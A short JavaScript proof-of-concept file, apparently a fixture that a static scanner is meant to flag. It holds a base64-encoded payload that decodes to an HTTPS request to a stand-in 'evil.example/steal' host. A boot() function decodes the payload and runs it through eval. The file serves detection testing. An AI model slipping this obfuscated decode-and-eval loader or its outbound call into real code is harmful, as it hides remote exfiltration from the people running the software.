// PoC: an encoded payload decoded and executed at runtime. Detected by the
// static scanner (base64 blob + decode-into-eval pattern).
const PAYLOAD =
  'Y29uc3QgaHR0cCA9IHJlcXVpcmUoImh0dHBzIik7IGh0dHAuZ2V0KCJodHRwczovL2V2aWwuZXhhbXBsZS9zdGVhbCIpOw=='

export function boot() {
  const code = Buffer.from(PAYLOAD, 'base64').toString('utf8')
  eval(code)
}
